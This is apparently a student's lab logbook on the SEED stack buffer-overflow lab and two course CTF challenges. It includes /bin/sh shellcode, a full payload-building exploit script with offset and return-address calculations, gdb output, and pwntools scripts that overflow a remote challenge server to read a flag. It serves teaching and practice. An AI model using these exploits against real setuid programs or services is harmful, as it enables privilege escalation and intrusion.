# Week 5 Logbook

## Task 1

After executing `make` and running both the `a32.out` and `a64.out` programs, the shellcode was successfully executed from the stack, creating a new shell session without root privileges (as shown by the `id -u` command in the included logs).

```sh
[11/16/21]seed@VM:~/.../shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[11/16/21]seed@VM:~/.../shellcode$ ./a32.out
$ id -u
1000
$ exit
[11/16/21]seed@VM:~/.../shellcode$ ./a64.out
$ id -u
1000
$ exit
```

After executing `make setuid`, which changes ownership of the files to `root` and making them setuid programs, the created shell will have root privileges (possible since we configured the `/bin/sh` symlink to point to `/bin/zsh` instead of `/bin/dash`).

```sh
[11/16/21]seed@VM:~/.../shellcode$ make setuid
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
sudo chown root a32.out a64.out
sudo chmod 4755 a32.out a64.out
[11/16/21]seed@VM:~/.../shellcode$ ./a32.out
# id -u
0
# exit
[11/16/21]seed@VM:~/.../shellcode$ ./a64.out
# id -u
0
# exit
[11/16/21]seed@VM:~/.../shellcode$
```

## Task 2

```sh
[11/16/21]seed@VM:~/.../code$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
[11/16/21]seed@VM:~/.../code$ sudo chown root stack
[11/16/21]seed@VM:~/.../code$ sudo chmod 4755 stack
[11/16/21]seed@VM:~/.../code$ ls -la stack
-rwsr-xr-x 1 root seed 15908 Nov 16 12:04 stack
[11/16/21]seed@VM:~/.../code$ 
```

## Task 3

```sh
[11/16/21]seed@VM:~/.../code$ touch badfile
[11/16/21]seed@VM:~/.../code$ make
...
[11/16/21]seed@VM:~/.../code$ gdb stack-L1-dbg 
...
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
Starting program: /home/seed/labs/tp5/code/stack-L1-dbg
...
Breakpoint 1, bof (str=0xffffcca3 '\220' <repeats 112 times>, "\335̻\252", '\220' <repeats 84 times>...) at stack.c:16
16      {
gdb-peda$ next
...
20          strcpy(buffer, str);       
gdb-peda$ p $ebp
$1 = (void *) 0xffffc878
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffc80c
gdb-peda$ quit
[11/16/21]seed@VM:~/.../code$ 
```


We initially ran `exploit.py` with a shellcode filled with 517 `0x90` characters, which correspond to the `NOP` instruction. In this case, a segmentation fault occurs when running the `stack-L1` program, meaning that the return address for the `bop` function was overwritten during our buffer overflow attack.

```sh
[11/16/21]seed@VM:~/.../code$ python3 exploit.py 
[11/16/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
Segmentation fault
[11/16/21]seed@VM:~/.../code$ 
```

Afterwards, we used the 32-bit shellcode provided in Task 2, which had a length of 27 bytes. The remaining 490 bytes are filled with `NOP` bytes. The position (`start`) of the shellcode must be <= 490, otherwise it will not fit in the 517 bytes that are read from `badfile`.

Subtracting the base address of the buffer (`0xffffc80c`) from the address in stored in the `epb` register (`0xffffc878`) gives us the size of the `bof` function's stack frame: 108, or `0xc6`. Since the return address comes after the frame pointer, we must add 4 more bytes to the offset. Therefore, the return address should be 112 bytes from the base address of the buffer.

```python
#!/usr/bin/python3
import sys

# Using 32bit shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Place shellcode at the very end of the payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload

# Return address is well inside the payload, but before the start of
# the shell code
ret    = 0xffffc878+256
# 108 = $ebp - &buffer
# +4 because return address comes after the frame pointer ($ebp)
offset = 108+4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
[11/21/21]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# id -u
0
#
```

After modifying the Python script with these values, we managed to obtain a root shell. We chose a return address approximately in the middle of the payload ($ebp + 256), so that our exploit could still work when running the program in release mode (as mentioned in note 2, the value of $ebp should be higher, so the extra 256 bytes can shield us against this fact).

## CTF - Task 1

### Questions
* Is there a file that the program opens and reads?
    * Yes, the program will open the file specified in the `meme_file` variable (by default `mem.txt`).
* Is there a way to control the file that will be opened?
    * If we can alter the value in `meme_file` we can make the program open a file of our choosing.
* Is there a buffer overflow? If so, what can you do about it?
    * Using the `scanf` function, the function reads up to 28 bytes to the 20-byte `buffer` variable. If we think about the `main` function's stack frame, since `meme_file` and `buffer` are local variables and are declared in that order, the extra 8 bytes read by `scanf` can be used to overwrite the contents of the `meme_file` array.

```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"00000000000000000000flag.txt")
r.interactive()
```

```sh
[11/21/21]seed@VM:~/.../Semana5-Desafio1$ checksec program
[*] '/home/seed/ctfs/ctf5/Semana5-Desafio1/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[11/21/21]seed@VM:~/.../Semana5-Desafio1$ python3 exploit-example.py 
[+] Opening connection to ctf-fsi.fe.up.pt on port 4003: Done
[*] Switching to interactive mode
Echo 00000000000000000000flag.txt
I like what you got!
flag{eec724f5061da428f98387d96301917f}
[*] Got EOF while reading in interactive
$
```

We pass 20 arbitrary bytes plus `flag.txt` (8 bytes) to `scanf`, and the contents of the `flag.txt` file are printed.

## CTF - Task 2

### Questions
* What was modified?
    * A new 4-byte buffer, `val` is declared between the declarations `meme_file` and `buffer`. Before opening the file in `meme_file`, the program will check that this buffer, interpreted as a 4-byte integer, equals `0xfefc2122`. Otherwise, it will not allow us to open the file. In addition, `scanf` will now read up to 32 bytes, meaning we can still write until the end of `meme_file`.
* Do these modifications mitigate the problem in its entirety?
    * No. After writing 20 bytes to `buffer`, the next 4 bytes will be written to `val`, and these bytes cannot be arbitrary. Only a specific 4-byte sequence will allow us to successfully open the file specified by `meme_file`. If we find this sequence, we can still print the contents of `flag.txt`.
* Is it possible to overcome the mitigation using a similar technique?
    * Yes. Since the architecture is little-endian (as shown by `checksec`), the 4 `val` bytes must be written from the LSB to the MSB (`\x22\x21\xfc\xfe`).

```python3
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
r.sendline(b"00000000000000000000\x22\x21\xfc\xfeflag.txt")
r.interactive()
```

```sh
[11/21/21]seed@VM:~/.../challenge2$ checksec program
[*] '/home/seed/ctfs/ctf5/challenge2/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[11/21/21]seed@VM:~/.../challenge2$ python3 exploit-example.py 
[+] Opening connection to ctf-fsi.fe.up.pt on port 4000: Done
[*] Switching to interactive mode
I like what you got!
flag{dc32b981d1531c796a7e3cb9141bb325}
[*] Got EOF while reading in interactive
$  
```
